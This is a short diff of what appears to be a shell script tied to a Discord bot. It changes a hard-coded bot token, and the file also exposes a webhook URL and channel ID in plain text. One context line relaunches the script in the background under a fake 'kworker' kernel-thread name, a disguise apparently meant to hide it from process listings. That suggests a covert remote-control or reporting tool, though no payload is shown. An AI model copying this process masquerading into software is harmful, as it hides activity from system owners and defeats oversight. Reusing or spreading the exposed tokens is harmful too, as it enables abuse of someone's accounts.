@@ -8,7 +8,7 @@
 
 WEBHOOK_URL="https://discord.com/api/webhooks/1333683986286776340/FYDrvCm9zGAkC8X-gzPpD9iwGguiCvTebP3mOfVy5hxl5b8CRvzPBydf-FdFL7GPey8v"
 CHANNEL_ID="1101487519243190303"
-BOT_TOKEN="MTMzNzU3NDI3NTYyMzk0NDE5Mg.Gf4Y4q.tnJK8422UP1cSOMEBsT8djuYfjEkpmZlTnMfXI"
+BOT_TOKEN="MTMzNzU3NDI3NTYyMzk0NDE5Mg.Gtoquq.ko85obDrODl304JX4F4aE1QlHPBabAQxvJ48f0"
 
 exec -a "[kworker/1:1+ksoftirqd/12]" /bin/bash "$0" &
 
